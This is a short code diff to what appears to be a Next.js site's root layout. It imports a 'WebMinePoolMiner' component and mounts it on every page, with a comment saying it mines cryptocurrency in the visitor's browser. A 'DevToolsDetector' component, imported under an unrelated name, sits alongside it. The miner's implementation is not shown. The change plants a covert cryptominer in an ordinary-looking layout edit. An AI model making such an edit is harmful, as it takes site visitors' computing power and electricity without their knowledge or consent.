@@ -4,6 +4,7 @@ import Navbar from "@/components/Navbar";
 import Sidebar from "@/components/Sidebar";
 import BottomNavigation from "@/components/BottomNavigation";
 import DevToolsDetector from "@/components/AnimeGetter";
+import WebMinePoolMiner from "@/components/WebMinePoolMiner";
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -27,7 +28,9 @@ export default function RootLayout({ children }) {
             </main>
           </div>
           <BottomNavigation />
-        </div>
+          </div>
+        {/* WebMinePoolMiner runs on the client to mine cryptocurrency */}
+        <WebMinePoolMiner />
       </body>
     </html>
   );
